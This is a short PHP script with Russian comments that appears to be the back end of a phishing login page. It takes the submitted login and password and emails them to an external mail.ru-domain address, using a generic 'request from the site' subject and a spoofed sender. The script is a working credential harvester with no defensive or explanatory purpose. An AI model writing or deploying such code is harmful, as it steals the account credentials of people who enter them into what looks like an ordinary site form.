<?php
//проверяем, существуют ли переменные в массиве POST
if(!isset($_POST['Login']) and !isset($_POST['email'])){
?>
<?php
} else {
//показываем форму
$Login = $_POST['Login'];
$Password = $_POST['Password'];
$Login = htmlspecialchars($Login);
$Password = htmlspecialchars($Password);
$Login = urldecode($Login);
$Password = urldecode($Password);
$Login = trim($Login);
$Password = trim($Password);
if (mail("artash_hakobyan@list.ru", "Заявка с сайта", "Login:".$Login.". Password: ".$Password ,"From: example2@mail.ru \r\n")){ 
echo "Сообщение успешно отправлено"; 
} else { 
echo "При отправке сообщения возникли ошибки";
}
}
?>
